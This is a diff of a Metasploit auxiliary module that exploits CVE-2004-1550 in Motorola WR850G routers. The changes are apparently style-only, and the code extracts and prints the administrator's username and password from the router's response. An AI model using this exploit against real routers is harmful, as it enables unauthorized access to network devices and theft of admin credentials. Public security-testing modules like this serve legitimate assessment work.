@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,31 +7,30 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Motorola WR850G v4.03 Credentials',
-      'Description'    => %q{
-          Login credentials to the Motorola WR850G router with
-        firmware v4.03 can be obtained via a simple GET request
-        if issued while the administrator is logged in.  A lot
-        more information is available through this request, but
-        you can get it all and more after logging in.
-      },
-      'Author'         => 'kris katterjohn',
-      'License'        => MSF_LICENSE,
-      'References'     => [
-          [ 'CVE', '2004-1550' ],
-          [ 'OSVDB', '10232' ],
-          [ 'URL', 'http://seclists.org/bugtraq/2004/Sep/0339.html'],
-      ],
-      'DisclosureDate' => 'Sep 24 2004'))
+                      'Name'           => 'Motorola WR850G v4.03 Credentials',
+                      'Description'    => %q(
+                          Login credentials to the Motorola WR850G router with
+                        firmware v4.03 can be obtained via a simple GET request
+                        if issued while the administrator is logged in.  A lot
+                        more information is available through this request, but
+                        you can get it all and more after logging in.
+                      ),
+                      'Author'         => 'kris katterjohn',
+                      'License'        => MSF_LICENSE,
+                      'References'     => [
+                        [ 'CVE', '2004-1550' ],
+                        [ 'OSVDB', '10232' ],
+                        [ 'URL', 'http://seclists.org/bugtraq/2004/Sep/0339.html']
+                      ],
+                      'DisclosureDate' => 'Sep 24 2004'))
 
     register_options([
-      Opt::RPORT(80)
-    ])
+                       Opt::RPORT(80)
+                     ])
   end
 
   def run
@@ -41,7 +41,7 @@ class MetasploitModule < Msf::Auxiliary
 
     disconnect
 
-    if response.nil? or response.empty?
+    if response.nil? || response.empty?
       print_status("No response from server")
       return
     end
@@ -52,9 +52,9 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    user = $1 if response.match("http_username=([^\n]*)<br>")
-    pass = $1 if response.match("http_passwd=([^\n]*)<br>")
+    user = Regexp.last_match(1) if response.match("http_username=([^\n]*)<br>")
+    pass = Regexp.last_match(1) if response.match("http_passwd=([^\n]*)<br>")
 
-    print_status("Found username \"#{user}\" and password \"#{pass}\"") if user and pass
+    print_status("Found username \"#{user}\" and password \"#{pass}\"") if user && pass
   end
 end
